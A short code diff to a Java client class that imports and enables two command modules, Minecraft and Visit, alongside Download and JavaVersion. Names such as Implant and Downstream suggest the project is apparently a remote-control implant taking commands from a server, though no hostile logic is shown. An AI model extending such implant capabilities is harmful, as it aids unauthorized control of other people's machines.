@@ -4,6 +4,8 @@ import casper.client.commands.Action;
 import casper.client.commands.Command;
 import casper.client.commands.impl.Download;
 import casper.client.commands.impl.JavaVersion;
+import casper.client.commands.impl.Minecraft;
+import casper.client.commands.impl.Visit;
 import casper.client.misc.Implant;
 import casper.net.Connection;
 import casper.net.Downstream;
@@ -48,7 +50,8 @@ public class Client implements Runnable {
     private static final Class<?>[] MODULES = {
             Download.class,
             JavaVersion.class,
-            //Minecraft.class /* Commented out because I can see some bad implementations... */
+            Minecraft.class,
+            Visit.class
     };
 
     {
